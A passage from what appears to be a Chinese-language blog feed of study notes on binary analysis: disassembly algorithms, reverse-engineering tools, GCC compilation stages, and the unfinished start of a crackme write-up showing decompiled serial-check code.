start="3"><li>无条件分支指令</li></ol><p>**无条件分支并不遵循线性流模式，因此，它由递归下降算法以不同的方式处理。**与顺序流指令一样，执行权只能传递给一条指令，但那条指令不需要紧接在分支指令后面。<u>递归下降反汇编器将尝试确定无条件跳转的目标，并将目标地址添加到要反汇编的地址列表中。</u>遗憾的是，某些无条件分支可能会给递归下降反汇编器造成麻烦。如果跳转指令的目标取决于一个运行时值，这时使用静态分析就无法确定跳转目标。 x86 的 jmp eax 指令就证实了这个问题。只有程序确实正在运行时， eax 寄存器中才会包含一个值。由于寄存器在静态分析过程中不包含任何值，因此无法确定跳转指令的目标，也就无法确定该从什么地方继续反汇编过程。</p><ol start="4"><li>函数调用指令</li></ol><p>函数调用指令的运行方式与无条件跳转指令非常相似（包括反汇编器无法确定 call eax 等指令的目标），唯一的不同在于，一旦函数完成，执行权将返回给紧跟在调用指令后面的指令。在这方面，它们与条件分支指令类似，因为它们都生成两条执行路径。<u>调用指令的目标地址被添加到推迟进行反汇编的地址列表中，而紧跟在调用后面的指令则以类似于线性扫描的方式进行反汇编。</u></p><ol start="5"><li>返回指令</li></ol><p>有时，递归下降算法访问了所有的路径。而且，函数返回指令（如 x86 ret）没有提供接下来将要执行的指令的信息。这时，如果程序确实正在运行，则可以从运行时栈顶部获得一个地址，并从这个地址开始恢复执行指令。但是，反汇编器并不具备访问栈的能力，因此反汇编过程会突然终止。这时，递归下降反汇编器会转而处理前面搁置在一旁的延迟反汇编地址列表。反汇编器从这个列表中取出一个地址，并从这个地址开始继续反汇编过程。递归下降反汇编算法正是因此而得名。</p><p>==递归下降算法的一个主要优点在于，它具有区分代码与数据的强大能力。==作为一种基于控制流的算法，它很少会在反汇编过程中错误地将数据值作为代码处理。递归下降算法的主要缺点在于，它无法处理间接代码路径，如利用指针表来查找目标地址的跳转或调用。然而，通过采用一些用于识别指向代码的指针的启发（ heuristics）式方法，递归下降反汇编器能够提供所有代码，并清楚地区分代码与数据。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件</title>
      <link href="/2023/12/18/Security/binary/reverse/%E9%80%86%E5%90%91%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/12/18/Security/binary/reverse/%E9%80%86%E5%90%91%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="逆向与反汇编工具">逆向与反汇编工具</h1><h2 id="1-分类工具">1 分类工具</h2><blockquote><p>绝不要根据文件的扩展名来确定文件的类型。</p></blockquote><h3 id="11-file">1.1 file</h3><p>file 命令是一个标准的实用工具，大多数*NIX 风格的操作系统和 Windows 下的 Cygwin①或MinGw②工具都带有这个实用工具。file 试图通过检查文件中的某些特定字段来确认文件的类型。</p><p>file 能够识别常见的字符串，如#!/bin/sh（ shell 脚本文件）或<html>（ HTML 文档）。但是，识别那些包含非 ASCII 内容的文件要困难得多，在这种情况下， file 会设法判断该文件的结构是否符合某种已知的文件格式。多数情况下，它会搜索某些文件类型所特有的标签值（通常称为幻数③）。下面的十六进制表列出了几个用于判断常见文件类型的幻数。</p><p><u>幻数是一些文件格式规范所要求的特殊标签值，它表示文件符合这种规范。</u></p><img src="mdPic/image-20220927112954200.png" alt="image-20220927112954200" style="zoom:80%;" /><h3 id="12-pe-tools">1.2 PE Tools</h3><p>PE Tools①是一组用于分析 Windows 系统中正在运行的进程和可执行文件的工具。</p><h3 id="13-peid">1.3 PEiD</h3><p>PEiD①是另一款 Windows 工具，它主要用于识别构建某一特定 Windows PE 二进制文件所使用的编译器，并确定任何用于模糊 Windows PE 二进制文件的工具。</p><p>PEiD 的许多其他功能与 PE Tools 的功能相同，包括显示PE文件头信息摘要、收集有关正在运行的进程的信息、执行基本的反汇编等。</p><h2 id="2-摘要工具">2 摘要工具</h2><blockquote><p>目标是对二进制程序文件进行逆向工程，因此，在对文件进行初步分类后，需要用更高级的工具来提取详尽的信息。</p></blockquote><h3 id="21-nm">2.1 nm</h3><p>将源文件编译成目标文件时，编译器必须嵌入一些全局（外部）符号的位置信息，以便链接器在组合目标文件以创建可执行文件时，能够解析对这些符号的引用。除非被告知要去除最终的可执行文件中的符号，否则，链接器通常会将目标文件中的符号带入最终的可执行文件中。根据nm手册的描述，这一实用工具的作用是“列举目标文件中的符号”。</p><p>使用 nm 检查中间目标文件（扩展名为.o 的文件，而非可执行文件）时，默认输出结果是在这个文件中声明的任何函数和全局变量的名称。</p><img src="mdPic/image-20220927114212093.png" alt="image-20220927114212093" style="zoom:80%;" /><p>U，未定义符号，通常为外部符号引用。<br>T，在文本部分定义的符号，通常为函数名称。<br>t，在文本部分定义的局部符号。在 C 程序中，这个符号通常等同于一个静态函数。<br>D，已初始化的数据值。<br>C，未初始化的数据值。</p><h3 id="22-ldd">2.2 ldd</h3><p>ldd（ list dynamic dependencies）是一个简单的实用工具，可用来列举任何可执行文件所需的动态库。</p><p>创建可执行文件时，必须解析该文件引用的任何库函数的地址。链接器通过两种方法解析对库函数的调用： 静态链接（ static linking）和动态链接（ dynamic linking）。链接器的命令行参数决定具体使用哪一种方法。一个可执行文件可能为静态链接、动态链接，或二者兼而有之。</p><p>静态链接的优点包括：函数调用更快一些；发布二进制文件更加容易，因为这时不需要对用户系统中库函数的可用性做出任何假设。其缺点包括：生成的可执行文件更大；如果库组件发生改变，对程序进行升级会更加困难，因为一旦库发生变化，程序就必须重新链接。</p><p>动态链接与静态链接不同。使用动态链接时，链接器不需要复制它需要的任何库。相反，链接器只需将对所需库（<a href="http://xn--siqs30btv1b.so">通常为.so</a> 或.dll 文件）的引用插入到最终的可执行文件中。因此，这时生成的可执行文件也更小一些。而且，使用动态链接时升级库代码也变得简单多了，因为只需要维护一个库（被许多二进制文件引用），如果需要升级库代码，用新版本的库替换过时的库，就可以立即更新每一个引用该库的二进制文件。</p><p>使用动态链接的一个缺点在于，它需要更加复杂的加载过程。因为这时必须定位所有所需的库，并将其加载到内存中，而不是加载一个包含全部库代码的静态链接文件。动态链接的另一个缺点是，供应商不仅需要发布他们自己的可执行文件，而且必须发布该文件所需的所有库文件。</p><h3 id="23-objdump">2.3 objdump</h3><p>objdump 是 GNU binutils①工具套件的一部分，用户可以在 Linux、 FreeBSD 和 Windows（通过 Cygwin）系统中找到这个工具。 objdump 依靠二进制文件描述符库 libbfd（二进制工具的一个组件）来访问目标文件，因此，它能够解析 libbfd 支持的文件格式（ ELF、 PE 等）。</p><p>另外，一个名为 readelf 的实用工具也可用于解析 ELF 文件。 readelf 的大多数功能与 objdump 相同，它们之间的主要区别在于 readelf 并不依赖 libbfd。</p><p>与专用的 ldd 不同， objdump 的功能非常多样。显示与目标文件有关的信息是 objdump 的功能。这是一个相当宽泛的目标， objdump 为此提供了大量命令行选项（超过 30 个），以提取目标文件中的各种信息。 objdump 可用于显示以下与目标文件有关的信息（以及其他更多信息）。</p><ul><li> 节头部，程序文件每节的摘要信息。</li><li> 专用头部，程序内存分布信息，还有运行时加载器所需的其他信息，包括由 ldd 等工具生成的库列表。</li><li> 调试信息，提取出程序文件中的任何调试信息。</li><li> 符号信息，以类似 nm 的方式转储符号表信息。</li><li> 反汇编代码清单， objdump 对文件中标记为代码的部分执行线性扫描反汇编。</li></ul><p>反汇编 x86代码时， objdump 可以生成 AT&amp;T 或 Intel 语法，并可以将反汇编代码保存在文本文件中。这样的文本文件叫做反汇编死代码清单（ dead listing），尽管这些文件可用于实施逆向工程，但它们很难有效导航，也无法以一致且无错的方式被修改。</p><h3 id="24-otool">2.4 otool</h3><p>otool 可用于解析与 OS X Mach-O 二进制文件有关的信息，因此，可简单将其描述为 OS X系统下的类似于 objdump 的实用工具。otool 可用于显示与文件的头部和符号表有关的信息，并对文件的代码部分进行反汇编。</p><h3 id="25-dumpbin">2.5 dumpbin</h3><p>dumpbin 是微软 Visual Studio 工具套件中的一个命令行实用工具。与 otool 和 objdump 一样，dumpbin 可以显示大量与 Windows PE 文件有关的信息。</p><p>dumpbin 的其他选项可从 PE 二进制文件的各个部分提取信息，包括符号、导入的函数名、导出的函数名和反汇编代码。</p><h3 id="26-cfilt">2.6 c++filt</h3><h2 id="3-深度检测工具">3 深度检测工具</h2><h3 id="31-strings">3.1 strings</h3><p>strings 实用工具专门用于提取文件中的字符串内容，通常，使用该工具不会受到文件格式的限制。</p><img src="mdPic/image-20220927115140247.png" alt="image-20220927115140247" style="zoom:80%;" /><ul><li> 需要牢记的是，使用 strings 处理可执行文件时，默认情况下， strings 仅仅扫描文件中可加载的、经初始化的部分。使用命令行参数–a 可强制 strings 扫描整个文件。</li><li> strings 不会指出字符串在文件中的位置。使用命令行参数–t 可令 strings 显示所发现的每一个字符串的文件偏移量信息。</li><li> 许多文件使用了其他字符集。使用命令行参数–e 可使 strings 搜索更广泛的字符，如 16位 Unicode 字符。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1 预处理阶段</title>
      <link href="/2023/12/18/Security/binary/lifecircle/1.%E9%A2%84%E5%A4%84%E7%90%86%E9%98%B6%E6%AE%B5/"/>
      <url>/2023/12/18/Security/binary/lifecircle/1.%E9%A2%84%E5%A4%84%E7%90%86%E9%98%B6%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>编译过程从你要编译的各种源文件开始（可能只有一个源文件，但大型程序通常由许多文件组成）。这不仅使得项目更易于管理，而且加快了编译速度，因为如果一个文件发生了更改，只需重新编译该文件而不是所有代码。</p></blockquote><p>C的源文件包含宏（用#define表示）和#include指令。可以使用#include指令包含源文件所依赖的头文件（扩展名为.h）。</p><p><mark>预处理阶段扩展了源文件中的所有#define和#include指令，因此剩下的就是准备编译的纯C代码。</mark></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260946708.png" alt="image-20220922213822968"></p><p>默认情况下，GCC会自动执行所有的编译阶段，因此必须明确告诉它在预处理后停止，并显示中间输出。</p><p>对GCC来说，这可以使用命令<code>gcc -E -P</code>来完成，其中-E告诉GCC在预处理后停止，-P使GCC忽略调试信息，以便输出更清晰。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260946934.png" alt="image-20220922213955651"></p><p>==stdio.h头文件全部包含在内，其所有的类型定义、全局变量及函数原型都被“复制”到源文件中。==因为每个#include指令都会发生这种情况，所以预处理器输出可能非常冗长。==预处理器还完整地扩展了#define定义的任何宏的所有用法。==在示例中，这意味着对printf(FORMAT_STRING❶和MESSAGE❷)的两个参数进行计算，并用它们所代表的常量字符串进行替换。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> 二进制生命周期 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2 编译阶段</title>
      <link href="/2023/12/18/Security/binary/lifecircle/2.%E7%BC%96%E8%AF%91%E9%98%B6%E6%AE%B5/"/>
      <url>/2023/12/18/Security/binary/lifecircle/2.%E7%BC%96%E8%AF%91%E9%98%B6%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="编译阶段">编译阶段</h2><blockquote><p>编译阶段采用预处理代码并将代码转换为汇编语言。大多数编译器也会在此阶段进行大量的优化，通常可以通过命令行开关配置优化级别，如GCC中的选项-O0到O3。</p></blockquote><!--为什么编译阶段会将代码转换为汇编语言而不是机器代码？这个设计决策似乎在一种语言（在本例中为C）的上下文中没有意义，但是当你考虑其他语言的时候，这样做确实是有意义的。对一些编译语言如C、C++、Objective-C、Common Lisp、Delphi、Go及Haskell等，编写一种能够直接为每种语言翻译（emit）机器代码的编译器是一项极其苛刻且耗时的任务，因此最好先为其翻译出汇编代码（已经是一项足够具有挑战性的任务了），并且需要有一个专用的汇编程序，以处理每种语言的汇编代码到机器代码的转换。--><p>GCC通常会自动调用所有的编译阶段， 因此要从编译阶段查看已翻译的汇编，你要告诉GCC在此阶段后必须停止，并将汇编文件存储到磁盘。使用-S标志执行此操作（.s是汇编文件的常规扩展名）。还可以将选项-masm-intel传递给GCC，让它以Intel语法而不是默认的AT&amp;T语法翻译汇编语言。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260948453.png" alt="image-20240426094830410" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> 二进制生命周期 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3 汇编阶段</title>
      <link href="/2023/12/18/Security/binary/lifecircle/3.%E6%B1%87%E7%BC%96%E9%98%B6%E6%AE%B5/"/>
      <url>/2023/12/18/Security/binary/lifecircle/3.%E6%B1%87%E7%BC%96%E9%98%B6%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="汇编阶段">汇编阶段</h2><blockquote><p>汇编阶段将得到真正的机器代码，汇编阶段的输入是在编译阶段生成的汇编语言集，输出是一组对象文件，有时简称为模块。</p><p>对象文件原则上包含可由处理器执行的机器指令。</p><p>通常情况下，每个源文件对应一个汇编文件，每个汇编文件对应一个对象文件。</p></blockquote><p>生成对象文件，传递-c标志给gcc，</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260949597.png" alt="image-20240426094902568" style="zoom:67%;" /><p>可以使用file工具来确认生成的compilation_example.o文件确实是对象文件。</p><p>file输出的第一部分显示了该文件符合二进制可执行文件的ELF规范。具体地，是一个64位的ELF二进制文件（因为在这个示例中编译的是x86_64），并且是最低有效位（Least Significant Bit，LSB），这意味着数在内存中的排序是以最低有效字节优先的。但最重要的是，可以看到该文件是可重定位的。</p><blockquote><p>可重定位文件不依赖于放置在内存中的任何特定地址，相反，它们可以随意移动，而不会破坏代码中的任何假设。当在文件输出中看到术语“可重定位”时，表示正在处理的是对象文件而不是可执行文件。</p><p>对象文件相互独立编译，因此汇编程序在组装对象文件时无法知道其他对象文件的内存地址。这就是对象文件需要可重定位的原因，这样就可以按照任意顺序将对象文件链接在一起，形成完整的二进制可执行文件。如果对象文件不可重定位，则无法实现文件的任意顺序组合。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> 二进制生命周期 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crackme_crypto</title>
      <link href="/2023/12/18/Security/binary/reverse/crackme_crypto/"/>
      <url>/2023/12/18/Security/binary/reverse/crackme_crypto/</url>
      
        <content type="html"><![CDATA[<p>目标是解析flag，为一个序列号</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261022545.png" alt="image-20220924212335536" style="zoom:80%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261022117.png" alt="image-20220924212358413" style="zoom:80%;" /><p>查看PE文件，可见是一个win32程序，32位exe，并且加壳了，加壳工具是tElock，首先脱壳得到脱壳后的文件。</p><p>用IDA反编译：</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261022446.png" alt="image-20220924212940285" style="zoom:80%;" /><p>分析DialogFunc，获取最终的flag；</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021340.png" alt="image-20220925151918644"></p><p>此处应该是获取了两个输入，用户名和序列号。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021975.png" alt="image-20220924213216124" style="zoom:80%;" /><p>DialogFunc中可分析出由一个子函数控制着序列号正确与否，接着去分析sub_401610，该函数接受的参数是lpString，也是输入的序列号，尝试去找到该序列号的正确匹配结果;</p><p>查看sub_401610函数的伪代码，其中又调用了其他函数过程，挨个分析吧；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401610</span><span class="params">(<span class="type">int</span> a1, LPCSTR lpString)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  __int16 v3; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v6; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">bool</span> v14; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">bool</span> v15; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+0h] [ebp-1CCh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [esp+4h] [ebp-1C8h]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [esp+5Ch] [ebp-170h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+64h] [ebp-168h]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [esp+6Ch] [ebp-160h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+6Dh] [ebp-15Fh]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+6Eh] [ebp-15Eh]</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [esp+6Fh] [ebp-15Dh]</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [esp+70h] [ebp-15Ch]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [esp+71h] [ebp-15Bh]</span></span><br><span class="line">  <span class="type">char</span> v27; <span class="comment">// [esp+72h] [ebp-15Ah]</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [esp+73h] [ebp-159h]</span></span><br><span class="line">  <span class="type">char</span> v29; <span class="comment">// [esp+74h] [ebp-158h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [esp+178h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [esp+17Ch] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [esp+180h] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [esp+184h] [ebp-48h]</span></span><br><span class="line">  <span class="type">char</span> v34; <span class="comment">// [esp+188h] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [esp+1A8h] [ebp-24h]</span></span><br><span class="line">  <span class="type">char</span> *v36; <span class="comment">// [esp+1BCh] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// [esp+1C8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v36 = &amp;v17;</span><br><span class="line">  sub_401000(&amp;v17);</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v2 = lstrlenA(lpString);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  v4 = (<span class="type">char</span> *)operator new(v2);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  v6 = sub_401020(lpString, v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)v6 &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4092DC(v5);</span><br><span class="line">    v37 = <span class="number">-1</span>;</span><br><span class="line">    nullsub_1(&amp;v17);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5[v6] = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)v6 &lt;= <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">      sub_408310(&amp;v18);</span><br><span class="line">      v10 = lstrlenA(String);</span><br><span class="line">      sub_408340(&amp;v18, String, v10);</span><br><span class="line">      sub_4085F0(&amp;v18);</span><br><span class="line">      v21 = <span class="number">41</span>;</span><br><span class="line">      v22 = <span class="number">71</span>;</span><br><span class="line">      v23 = <span class="number">7</span>;</span><br><span class="line">      v24 = <span class="number">-123</span>;</span><br><span class="line">      v25 = <span class="number">-121</span>;</span><br><span class="line">      v26 = <span class="number">51</span>;</span><br><span class="line">      v27 = <span class="number">37</span>;</span><br><span class="line">      v28 = <span class="number">68</span>;</span><br><span class="line">      sub_408FF0(&amp;v21, <span class="number">8</span>, &amp;v29);</span><br><span class="line">      sub_4090F0(v5, <span class="number">8</span>, &amp;v29);</span><br><span class="line">      v11 = &amp;v19;</span><br><span class="line">      v12 = v5;</span><br><span class="line">      v13 = <span class="number">8</span>;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">      v14 = <span class="number">0</span>;</span><br><span class="line">      v15 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !v13 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v14 = (<span class="type">unsigned</span> __int8)*v11 &lt; (<span class="type">unsigned</span> __int8)*v12;</span><br><span class="line">        v15 = *v11++ == *v12++;</span><br><span class="line">        --v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v15 );</span><br><span class="line">      <span class="keyword">if</span> ( !v15 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">          v16 = <span class="number">-2</span>;</span><br><span class="line">        ++v16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v16 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4092DC(v5);</span><br><span class="line">        v37 = <span class="number">-1</span>;</span><br><span class="line">        nullsub_1(&amp;v17);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v30 = <span class="number">0</span>;</span><br><span class="line">        v31 = <span class="number">0</span>;</span><br><span class="line">        v32 = <span class="number">0</span>;</span><br><span class="line">        v33 = <span class="number">0</span>;</span><br><span class="line">        sub_4071D0(v5 + <span class="number">8</span>, (<span class="type">int</span>)&amp;v30);</span><br><span class="line">        sub_4092DC(v5);</span><br><span class="line">        sub_4071D0(a65537, (<span class="type">int</span>)&amp;v31);</span><br><span class="line">        sub_406ED0(aB80a90bf53c6c9, (<span class="type">int</span>)&amp;v32);</span><br><span class="line">        sub_405E40(v30, v31, v32, &amp;v33);</span><br><span class="line">        sub_4014F0(&amp;v20, <span class="number">8</span>, &amp;v34);</span><br><span class="line">        v35 = <span class="number">0</span>;</span><br><span class="line">        sub_406ED0(&amp;v34, (<span class="type">int</span>)&amp;v35);</span><br><span class="line">        <span class="keyword">if</span> ( sub_402290(v35, v33) )</span><br><span class="line">        &#123;</span><br><span class="line">          v37 = <span class="number">-1</span>;</span><br><span class="line">          nullsub_1(&amp;v17);</span><br><span class="line">          result = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v37 = <span class="number">-1</span>;</span><br><span class="line">          nullsub_1(&amp;v17);</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v5[v7];</span><br><span class="line">        <span class="keyword">if</span> ( v8 &lt; <span class="number">48</span> || v8 &gt; <span class="number">57</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ++v7 &gt;= v6 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      &#125;</span><br><span class="line">      sub_4092DC(v5);</span><br><span class="line">      v37 = <span class="number">-1</span>;</span><br><span class="line">      nullsub_1(&amp;v17);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261022808.png" alt="image-20220924213626537" style="zoom:80%;" /><p>追踪lpString的长度，</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4 链接阶段</title>
      <link href="/2023/12/18/Security/binary/lifecircle/4.%E9%93%BE%E6%8E%A5%E9%98%B6%E6%AE%B5/"/>
      <url>/2023/12/18/Security/binary/lifecircle/4.%E9%93%BE%E6%8E%A5%E9%98%B6%E6%AE%B5/</url>
      
